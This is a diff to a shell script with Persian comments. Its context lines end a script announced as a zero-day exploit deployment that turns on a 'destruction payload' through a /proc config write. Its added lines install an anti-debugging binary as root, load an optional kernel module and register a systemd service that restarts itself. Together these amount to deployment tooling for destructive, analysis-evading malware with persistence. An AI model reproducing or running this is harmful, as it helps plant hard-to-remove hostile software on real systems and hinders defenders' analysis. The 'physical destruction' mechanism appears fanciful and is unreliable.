@@ -165,3 +165,78 @@ echo "[*] فعال‌سازی پیلود تخریب"
 echo "DESTROY_MODE=PHYSICAL" > /proc/omni-zero/config
 
 echo "[+] استقرار اکسپلویت Zero-Day با موفقیت انجام شد!"
+
+# اسکریپت استقرار سیستم ضد دیباگ پیشرفته
+
+# تنظیمات اولیه
+CONFIG_FILE="advanced_anti_debug.cfg"
+BINARY_NAME="advanced_anti_debug"
+INSTALL_DIR="/usr/local/bin"
+CONFIG_DIR="/etc/advanced_anti_debug"
+
+# بررسی دسترسی root
+if [ "$(id -u)" -ne 0 ]; then
+    echo "[-] این اسکریپت نیاز به دسترسی root دارد"
+    exit 1
+fi
+
+# کامپایل کد
+echo "[*] در حال کامپایل کد..."
+make clean
+make all
+if [ $? -ne 0 ]; then
+    echo "[-] خطا در کامپایل کد"
+    exit 1
+fi
+
+# تولید پیکربندی پویا
+echo "[*] تولید پیکربندی پویا..."
+python3 scripts/config_generator.py
+if [ $? -ne 0 ]; then
+    echo "[-] خطا در تولید پیکربندی"
+    exit 1
+fi
+
+# نصب باینری
+echo "[*] نصب باینری اجرایی..."
+cp $BINARY_NAME $INSTALL_DIR
+chmod 755 $INSTALL_DIR/$BINARY_NAME
+
+# نصب فایل پیکربندی
+echo "[*] نصب فایل پیکربندی..."
+mkdir -p $CONFIG_DIR
+cp $CONFIG_FILE $CONFIG_DIR
+chmod 600 $CONFIG_DIR/$CONFIG_FILE
+
+# نصب ماژول هسته (اختیاری)
+if [ -f drivers/anti_debug.ko ]; then
+    echo "[*] نصب ماژول سطح هسته..."
+    insmod drivers/anti_debug.ko
+    cp drivers/anti_debug.ko /lib/modules/$(uname -r)/kernel/drivers/
+    depmod -a
+fi
+
+# ایجاد سرویس سیستم
+echo "[*] ایجاد سرویس سیستم..."
+cat > /etc/systemd/system/advanced-anti-debug.service <<EOF
+[Unit]
+Description=Advanced Anti-Debugging System
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=$INSTALL_DIR/$BINARY_NAME
+Restart=always
+RestartSec=10
+KillMode=process
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# فعال‌سازی سرویس
+systemctl daemon-reload
+systemctl enable advanced-anti-debug
+systemctl start advanced-anti-debug
+
+echo "[+] استقرار سیستم با موفقیت انجام شد!"
